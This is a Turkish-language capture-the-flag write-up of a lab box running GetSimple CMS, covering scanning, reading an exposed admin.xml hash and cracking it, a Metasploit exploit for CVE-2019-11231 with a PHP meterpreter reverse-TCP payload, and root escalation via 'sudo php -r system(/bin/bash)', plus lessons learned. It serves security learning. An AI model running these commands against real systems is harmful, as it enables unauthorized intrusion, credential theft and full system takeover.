**Zafiyet zinciri:** Korumasız dizin → hash sızıntısı → panel girişi → CMS RCE → sudo yanlış yapılandırması → root
## 1. Keşif (Recon)

```bash
nmap -sC -sV -oA nmap/gettingstarted 10.129.42.249
```

**Bulgular:**

| Port | Servis | Sürüm |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 |
| 80/tcp | HTTP | Apache 2.4.41 (Ubuntu) |

Ek ipuçları: `robots.txt` içinde `/admin/` engellenmiş, sayfa başlığı `Welcome to GetSimple!`.

**Çıkarım:** OpenSSH 8.2p1 ile Apache 2.4.41 kombinasyonu Ubuntu 20.04 (Focal) işaret eder. Bunu kesin bilgi olarak değil, çalışma varsayımı olarak not ettim. Apache 2.4.41 için doğrudan kullanılabilir bir uzaktan kod çalıştırma zafiyeti bulunmadığından saldırı yüzeyi uygulama katmanına kaydı.

> [!tip] Ders
> `robots.txt` bir engelleme dosyası değil, yol haritasıdır. Yönetici oraya gizlemek istediği dizinleri yazar.

---

## 2. Web Enumeration

```bash
ffuf -u http://10.129.42.249/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

ffuf -u http://10.129.42.249/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.bak
```

**Dizinler:** `data`, `admin`, `plugins`, `theme`, `backups`, `server-status` (403)

**Dosyalar:** `index.php`, `robots.txt`, `sitemap.xml`, `readme.txt`, `LICENSE.txt`

**Değerlendirme:** `.ht*` dosyalarının hepsi 403 döndü, yani Apache onları koruyor. Buna karşılık `data/` dizini erişime açıktı. Bu ikisi arasındaki tutarsızlık asıl bulgudur: yönetici bazı yolları korumuş, uygulamanın veri dizinini korumayı unutmuştur.

---

## 3. Kimlik Bilgisi Sızıntısı

```bash
curl http://10.129.42.249/data/users/admin.xml
```

Dosya, kullanıcı adını ve hash'lenmiş parolayı düz XML olarak veriyordu.

```bash
hashid <hash>          # algoritma tespiti → SHA-1
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```

**Sonuç:** `admin:admin`

> [!tip] Ders
> GetSimple CMS parolaları veritabanı yerine XML dosyalarında tutar. Bir CMS ile karşılaştığında "bu uygulama verisini nerede saklıyor?" sorusunu sor ve o dizini doğrudan dene. Zaman kazandırır.

---

## 4. Panel Girişi ve Sürüm Tespiti

`http://10.129.42.249/admin/` adresinden `admin:admin` ile giriş yapıldı. Panelde çalışan sürüm **GetSimple CMS 3.3.15** olarak görüldü.

Sürüm bilgisi sayfa kaynağındaki `<meta name="generator">` etiketinden de okunabilir. Panele girmeden önce bunu kontrol etmek daha hızlı bir yoldur.

---

## 5. Erişim (Foothold)

```
msfconsole
search getsimple
use exploit/multi/http/getsimplecms_unauth_code_exec
set RHOSTS 10.129.42.249
set TARGETURI /
set LHOST <tun0-ip>
set payload php/meterpreter/reverse_tcp
run
```

**Referans:** CVE-2019-11231

**Zafiyetin mantığı:** Exploit önce `data/other/authorization.xml` dosyasından API anahtarını okur, ardından bu anahtarla oturum çerezi üretip kimlik doğrulamayı atlar, son olarak `admin/theme-edit.php` üzerinden PHP dosyası yükler. Yani elle yaptığım işin (hash kırma) otomatikleştirilmiş bir versiyonunu çalıştırdım.

> [!info] TARGETURI notu
> Bu alan tam URL değil, CMS'in kök dizinine giden yoldur. CMS site kökünde çalıştığı için `/` doğru değerdir.
> **Doğrulama:** `curl http://HEDEF/data/other/authorization.xml` isteği XML döndürüyorsa yol doğrudur.

**Sonuç:** `www-data` olarak meterpreter oturumu.

---

## 6. user.txt

```
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
ls -la /home/
cat /home/*/user.txt
```

> [!tip] Ders
> Meterpreter'ın `search` komutu dosyayı bulamadı, ancak `/home` dizinine elle bakınca dosya oradaydı. Uzaktan dosya sistemi taraması yavaş ve güvenilmezdir. CTF ortamında bayrak neredeyse her zaman `/home/<kullanıcı>/` veya `/root/` altındadır, önce oraya bak.

---

## 7. Yetki Yükseltme (Privilege Escalation)

```bash
sudo -l
```

```
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

**Satırın okunuşu:**

- `(ALL : ALL)` → herhangi bir kullanıcı ve grup kimliğiyle, root dahil
- `NOPASSWD` → parola sormadan
- `/usr/bin/php` → yalnızca bu program için

**Zafiyetin mantığı:** Sudo, bir programın ne yapabileceğini denetlemez, yalnızca adını denetler. PHP bir yorumlayıcıdır, yani yapabileceği işler sabit değildir. Kendisine verilen her kodu çalıştırır ve `system()` fonksiyonu üzerinden işletim sistemi komutu çağırabilir. Bir süreç başka bir süreç doğurduğunda yeni süreç ebeveyninin yetkisini devralır. Dolayısıyla root yetkisiyle çalışan PHP'nin başlattığı bash de root olur.

Yöneticinin "yalnızca PHP'ye izin verdim" düşüncesi, pratikte "PHP'nin çalıştırabileceği her şeye izin verdim" anlamına gelir.

```bash
sudo php -r "system('/bin/bash');"
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

---

## 8. Yapılan Hatalar ve Çıkarılan Dersler

| Hata | Doğrusu |
|---|---|
| Meterpreter prompt'unda `find`, `sudo` yazdım | Bu komutlar işletim sistemine aittir, önce `shell` komutuyla kabuğa geçilir |
| Meterpreter içinde `sessions -u` denedim | Bu msfconsole komutudur, önce `background` ile üst katmana çıkılır |
| `Ctrl+C` ile kanal kapattım | Katmanlar arası geçiş için `Ctrl+Z` kullanılır, `Ctrl+C` çalışan süreci öldürür |
| `cat /usr/bin/php` çalıştırdım | Derlenmiş ikili dosyayı ekrana bastım, terminal bozuldu. Düzeltmek için `reset` yazılır |
| Yetki yükseltmede ne yapacağımı bilemedim | Sabit bir kontrol listesi izlenmeli, ilk sırada `sudo -l` gelir |

---

## 9. Üç Katman Meselesi

Bu kutuda en çok zaman kaybettiğim yer burasıydı. Komut yazmadan önce hangi katmanda olduğuma bakmam gerekiyor.

```
msf >              ← msfconsole. Kendi makinemde. Modülleri ve oturumları yönetir.
meterpreter >      ← Hedefin belleğinde koşan ajan. Kendi komut dili var.
www-data@host:~$   ← Hedefin işletim sistemi kabuğu. find, sudo, su burada çalışır.
```

**Geçişler:**

| Nereden | Nereye | Komut |
|---|---|---|
| meterpreter | msf | `background` veya `Ctrl+Z` |
| msf | meterpreter | `sessions -i <id>` |
| meterpreter | OS kabuğu | `shell` |
| OS kabuğu | meterpreter | `Ctrl+Z` |

`Ctrl+C` bu listede yoktur. O, çalışan süreci öldürür.

---

## 10. Asıl Eksik

Bir programı root yetkisiyle çalıştırabiliyorsam, o programın yapabildiği **her şeyi** root olarak yapabilirim.

Bu fikrin adı GTFOBins mantığıdır. Elimde sudo veya SUID ile çalışan bir ikili dosya varsa ilk refleksim onu [gtfobins.github.io](https://gtfobins.github.io) sitesinde aratmak olmalıdır.
